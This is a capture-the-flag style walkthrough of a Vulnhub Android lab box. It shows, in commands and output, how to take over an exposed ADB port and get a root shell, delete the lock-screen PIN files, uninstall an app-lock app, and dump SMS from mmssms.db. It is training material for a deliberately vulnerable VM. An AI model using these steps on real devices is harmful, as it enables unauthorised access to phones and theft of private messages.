---
title: Vulnhub - Investigator
description: My writeup on Investigator box.
categories:
 - vulnhub
tags: vulnhub android adb
---

![](https://hackersfun.com/wp-content/uploads/2019/03/evil-android.jpg)

Hi all, firstly i didnt want to try this box because i have no idea how to pentest/hack an android box. In real life i don't even use/have a smart phone but then i say to myself it's a great way to learn something new, so let's pwn it!

You can find the machine there > [Investigator](https://www.vulnhub.com/entry/investigator-1,504/){:target="_blank"}

## Enumeration/Reconnaissance

Let's start always with nmap.

```
$ ip=192.168.1.10
$ nmap -sC -sV -p- -oN nmap/initial $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-06 01:52 EEST
Nmap scan report for android-25abe18209db8058.zte.com.cn (192.168.1.10)
Host is up (0.00025s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
5555/tcp  open  adb     Android Debug Bridge device (name: android_x86; model: VMware Virtual Platform; device: x86)
8080/tcp  open  http    PHP cli server 5.5 or later
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Welcome To  UnderGround Sector
22000/tcp open  ssh     Dropbear sshd 2014.66 (protocol 2.0)
| ssh-hostkey: 
|   2048 19:e2:9e:6c:c6:8d:af:4e:86:7c:3b:60:91:33:e1:85 (RSA)
|_  521 46:13:43:49:24:88:06:85:6c:75:93:73:b5:1d:8f:28 (ECDSA)
MAC Address: 00:0C:29:37:42:7C (VMware)
Service Info: OSs: Android, Linux; CPE: cpe:/o:linux:linux_kernel
```

port `5555` seems suspicious, i did some research on it and i found a way to exploit it. :)

port `5555` == adb service, adb (Android Debug Bridge) can control your device over USB or wireless by enabling a daemon server at port 5555.

Install adb: `sudo apt-get install adb`

## Exploiting adb service

Now let's exploit it, first we need to connect on target:

```
$ adb connect $ip:5555
connected to 192.168.1.10:5555
```

Now let's spawn a shell:

```
$ adb shell
uid=2000(shell) gid=2000(shell) groups=1003(graphics),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats)@x86:/ $ 
```

Bingo! That simple, we can even simplier take a root shell:

```
$ su
uid=0(root) gid=0(root)@x86:/ # 
```

Now because i have no idea how android file system is working, i decided to search for the root directory:

```
uid=0(root) gid=0(root)@x86:/ # find / -type d -name "root"
/data/root
```

We can see a `flag.txt` there:

```
uid=0(root) gid=0(root)@x86:/ # cd /data/root
uid=0(root) gid=0(root)@x86:/data/root # ls
flag.txt
uid=0(root) gid=0(root)@x86:/data/root # cat flag.txt
Great Move !!! 

Itz a easy one right ???

lets make this one lil hard


You flag is not here  !!!     


Agent "S"   Your Secret Key ---------------->259148637
```

## Removing PIN - finding the real flag

Here i stuck, i was searching for the flag for loooot of hours & then i deleted the box i said OK i got root shell i can't find the real flag. Today i had a chat with a friend on this box and we both stuck finding the real flag, i told him that you can remove the pin using adb shell. After some minutes he found the real flag! Shout out to @Freakazoid without him i wasn't able to gain the real flag! :D

Now as you can see, the android box asks for a PIN:

![](https://i.imgur.com/5xnXKzl.png)

We can remove this using our root shell, simply do this:

```
uid=0(root) gid=0(root)@x86:/ # cd /data/system
uid=0(root) gid=0(root)@x86:/data/system # rm *.key
```

& reboot the box, now we can see there is no PIN:

![](https://i.imgur.com/uTqpowJ.png)

If we go to open an app asks for a pattern:

![](https://i.imgur.com/ecarBwa.png)

Probably there is an app in background, that locks the other apps, let's search for it and remove it:

```
$ adb connect $ip:5555                       
connected to 192.168.1.10:5555
$ adb shell su 0 pm list packages | grep lock
package:com.domobile.applockwatcher
package:bong.android.androidlock
package:com.martianmode.applock <---
package:com.android.deskclock
```

`com.martianmode.applock` seems interesting, let's remove it:

```
$ adb uninstall com.martianmode.applock 
Success
```

Now we can see the real flag in messages:

![](https://i.imgur.com/GNjkEeN.png)

I learnt some new stuff, fux box :)

## Update - Reading sms without physical access

There is a way to read sms (flag) without doing all these stuff ^ by accessing the `mmssms.db` :

```
uid=0(root) gid=0(root)@x86:/ # cd /data/data/com.android.providers.telephony/databases
uid=0(root) gid=0(root)@x86:/data/data/com.android.providers.telephony/databases # ls 
mmssms.db
mmssms.db-journal
telephony.db
telephony.db-journal
uid=0(root) gid=0(root)@x86:/data/data/com.android.providers.telephony/databases # sqlite3 mmssms.db
SQLite version 3.7.11 2012-03-20 11:35:50
Enter ".help" for instructions
Enter SQL statements terminated with a ";"
sqlite> .tables
addr                 pdu                  threads            
android_metadata     pending_msgs         words              
attachments          rate                 words_content      
canonical_addresses  raw                  words_segdir       
drm                  sms                  words_segments     
part                 sr_pending         
sqlite> select * from sms;
1|5|(999) 999-9999||1593664987923|0||0|-1|5|||Welcome to  investigator ||0|0|1
2|5|(999) 999-9999||1593665026053|0||0|-1|6|||Your flag is in next chat||0|0|1
3|5|(999) 999-9999||1593665043359|0||1|-1|6|||welcome to investigator||0|0|1
4|6|(888) 888-8888||1593665065317|0||1|-1|6|||welcome to investigator||0|0|1
5|6|(888) 888-8888||1593665072797|0||1|-1|6|||your flag is not here||0|0|1
6|6|(888) 888-8888||1593665074507|0||1|-1|6|||welcome to investigator||0|0|1
7|7|(777) 777-7777||1593665090987|0||1|-1|6|||welcome to investigator||0|0|1
8|7|(777) 777-7777||1593665097063|0||1|-1|6|||your flag is not  here||0|0|1
9|8|(666) 666-6666||1593665111714|0||1|-1|6|||welcome to investigator||0|0|1
10|8|(666) 666-6666||1593665300650|0||1|-1|6|||share your screen shot in  telegram ------------ telegram group link ------------->https://t.me/joinchat/MnPu-hwn_MMS5sX0jngsoQ||0|0|1
11|8|(666) 666-6666||1593665656730|0||1|-1|6|||if the above link is not working share your screenshot at twitter -------->twitter id ------->@sivanes90967948||0|0|1
12|8|(666) 666-6666||1593665672721|0||1|-1|6|||welcome to investigator||0|0|1
13|9|(555) 555-5555||1593665743201|0||1|-1|6|||welcome to investigator||0|0|1
14|9|(555) 555-5555||1593665748223|0||1|-1|6|||no flag||0|0|1
15|9|(555) 555-5555||1593665749432|0||1|-1|6|||welcome to investigator||0|0|1
16|10|(444) 444-4444||1593665764190|0||1|-1|6|||welcome to investigator||0|0|1
17|10|(444) 444-4444||1593665766008|0||1|-1|6|||no flag||0|0|1
```

Simple! :D
